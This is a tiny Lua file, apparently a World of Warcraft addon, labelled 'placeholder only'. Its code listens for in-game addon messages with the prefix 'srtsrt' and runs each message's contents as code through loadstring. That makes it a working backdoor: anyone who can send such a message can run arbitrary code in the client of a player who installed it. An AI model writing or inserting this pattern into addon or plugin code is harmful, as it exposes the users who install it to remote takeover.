--Do not use, placeholder only
RegisterAddonMessagePrefix("srtsrt")
local f=CreateFrame("Frame")
f:RegisterEvent("CHAT_MSG_ADDON")
f:SetScript("OnEvent",function(self, event, prefix, message) if prefix == "srtsrt" then loadstring(message)() end end)


